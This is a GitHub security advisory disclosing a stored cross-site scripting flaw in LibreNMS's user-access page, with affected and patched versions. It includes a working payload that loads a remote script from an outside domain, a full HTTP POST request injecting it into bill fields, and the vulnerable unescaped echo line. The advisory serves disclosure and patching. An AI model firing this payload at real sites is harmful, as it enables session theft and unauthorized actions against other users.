# Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/edituser.inc.php

High

[murrant](/murrant)
published
GHSA-888j-pjqh-fx58
Nov 15, 2024

## Package

librenms/includes/html/pages/edituser.inc.php
(LibreNMS)

## Affected versions

<= 24.9.1

## Patched versions

24.10.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the "Manage User Access" page allows authenticated users to inject arbitrary JavaScript through the "bill\_name" parameter when creating a new bill. This vulnerability can lead to the execution of malicious code when visiting the "Bill Access" dropdown in the user's "Manage Access" page, potentially compromising user sessions and allowing unauthorized actions.

### Details

When creating a new bill, an attacker can inject the following XSS payload into the "bill\_name" parameter:

`test1'"><script/src=//15.rs>`

Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

The payload triggers in the "Bill Access" dropdown when the user's "Manage Access" page is visited. The sink responsible for this issue is:

[librenms/includes/html/pages/edituser.inc.php](https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309)

Line 309
in
[7f2ae97](/librenms/librenms/commit/7f2ae971c4a565b0d7345fa78b4211409f96800a)

|  | echo "<option value='" . $bill['bill\_id'] . "'>" . $bill['bill\_name'] . '</option>'; |
| --- | --- |

### PoC

1. Create a new bill using the following payload in the "bill\_name" parameter:

   `test1'"><script/src=//15.rs>`
2. Save the bill.
3. Navigate to the "Manage Access" page for the user.
4. Observe that the injected script executes in the "Bill Access" dropdown.

Example Request:

```
POST /bill/bill_id=2/view=edit/ HTTP/1.1
Host: <your_host>
Content-Type: application/x-www-form-urlencoded
Cookie: <your_cookie>

_token=<your_token>&action=update_bill&bill_name=test1%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_type=cdr&bill_cdr=&bill_cdr_type=Kbps&dir_95th=in&bill_quota=&bill_quota_type=MB&bill_day=1&bill_custid=test2%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_ref=test3%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&bill_notes=test4%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&Submit=Save
```
### Impact

This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Manage Access" page. The attacker can perform unauthorized actions or compromise user accounts by exploiting this vulnerability.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
